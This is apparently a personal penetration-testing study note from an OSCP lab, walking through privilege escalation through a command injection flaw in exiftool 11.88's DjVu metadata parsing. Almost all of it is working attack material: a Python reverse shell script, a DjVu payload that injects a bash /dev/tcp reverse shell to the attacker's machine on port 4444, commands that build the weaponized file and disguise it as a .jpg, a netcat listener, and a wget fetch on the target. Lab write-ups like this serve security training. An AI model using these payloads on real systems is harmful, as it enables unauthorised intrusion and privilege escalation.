According to ExploitDB 49881, exiftool version 11.88 contains a command injection vulnerability when parsing DjVu metadata. This provided a privilege escalation path.

We prepared the following files on our attacker machine:

shell.sh — reverse shell script:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${KaliIP}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > shell.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```
exploit — malicious DjVu metadata payload:

```
sudo gedit exploit
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `(metadata \"\\c\${system('bash -c \\\"bash -i >& /dev/tcp/${KaliIP}/4444 0>&1\\\"')};\")`;

dv.paragraph("```bash\n" + command + "\n```");
```
We then created the weaponized .djvu file, renamed it to .jpg, and staged it for upload:
```
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit && mv exploit.djvu exploit.jpg
```

Serve python server

```
python3 -m http.server 80
```

Start Reverse shell listener

```
rlwrap nc -lvnp 4444
```

On TARGET
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}/exploit.jpg`;

dv.paragraph("```bash\n" + command + "\n```");
```
